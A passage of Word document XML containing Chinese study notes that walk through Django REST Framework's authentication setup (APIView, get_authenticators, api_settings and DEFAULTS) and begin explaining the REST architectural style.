      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>authenticators</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>被传入参数的时候，它被赋值给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self.authenticators</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>。而实例化</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>对象是在</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D3FBD58"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521D8B06" wp14:editId="526B5905">
            <wp:extent cx="8751570" cy="3124200"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="47" name="图片 47">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761941" cy="3127902"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="214FAC71"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执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法时，我们分析一下调用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>initialize_request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法的时候都做了什么。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08972BDE"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rest_framework/views/class APIView/def initialize_request()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7A9BB2"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7B42E79C" wp14:editId="50BC40DC">
            <wp:extent cx="8568690" cy="3299460"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="46" name="图片 4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584699" cy="3305624"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB3D069"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Request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>对象被实例化的时候传入了参数，而这个参数是</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的返回值，</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做了什么呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594F1054"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rest_framework/views/class APIView/def get_authenticators()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49324B98"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6111150E" wp14:editId="6761B1D2">
            <wp:extent cx="8481695" cy="2125980"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="45" name="图片 45">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494243" cy="2129125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="298AE155"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它仅仅只是返回了一个列表推导式，可以推测</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self.authentication_classes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>是一个容器类型，里面的元素是一个一个的类，</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返回的是一个列表，里面是</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的类实例化出的对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF34EEC"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rest_framework/views/class APIView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442793CB"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29EFA92C" wp14:editId="6A39B554">
            <wp:extent cx="8200895" cy="2529840"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="44" name="图片 44">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42827" cy="2542775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5DA757"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是作为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>APIView</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的类属性出现的，当</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>进行属性查找的时候，首先查找的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>自身的属性和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>所属类的属性，然后是父类</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>APIView</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的类属性，如果我们在声明类的时候重写了类属性</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，那么在</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中得到的就是我们自己写的</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。如果没写的话，</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中是什么内容呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE99137"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rest_framework/settings.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3774D84D"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42EE4822" wp14:editId="4A521A6A">
            <wp:extent cx="8569325" cy="374469"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="43" name="图片 43">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712088" cy="380708"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="189ADC57"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先看</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>api_settings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>，它是模块</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>settings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>中实例化出的一个对象，它是基于模块的单例模式，每次引用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>api_settings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>时，都指向同一个内存地址。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0803AB55"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实例化出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>api_settings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的类如下图：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD0986D" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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rest_framework/settings.py/class APISettings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50743815"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4ACC3B16" wp14:editId="18038805">
            <wp:extent cx="8384540" cy="2141220"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="42" name="图片 42">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427490" cy="2152188"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="15985719" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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api_settings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>default</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>参数被传入了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>DEFAULTS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105208EA" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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5A85F72A" wp14:editId="6067EDCF">
            <wp:extent cx="6749321" cy="2682240"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="41" name="图片 41">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56493" cy="2685090"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="362CC0A4" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00032D99" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">　　可以看到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>api_settings.xxx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>操作很多时候是直接去</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>DEFAULTS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>中拿值的。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>DEFAULTS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>是一个配置默认设置的字典。也就是说，当我们不自己在声明的类中重写</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属性的时候，会从</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>settings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>配置文件中找一个叫</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>"REST_FRAMEWORK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的字典</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>，先在这个字典中找有没有相应的属性或者方法，如果没有的话就会走默认值配置的</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE71FED"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REST:Representational State Transfer</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的缩写，翻译：</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具象状态传输</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。一般解释为</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表现层状态转换</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 xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C0CAD2"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w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是设计风格而不是标准。是指客户端和服务器的交互形式。我们需要关注的重点是如何设计</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>REST</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>风格的网络接口。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D31C0B7"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w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的特点：</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BB11EF"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1.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>具象的。一般指表现层，要表现的对象就是资源。比如，客户端访问服务器，获取的数据就是资源。比如文字、图片、音视频等。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BABD569"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lastRenderedPageBreak/>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>表现：资源的表现形式。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>txt</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>格式、</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>格式、</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>格式、</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>jpg</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>格式等。浏览器通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
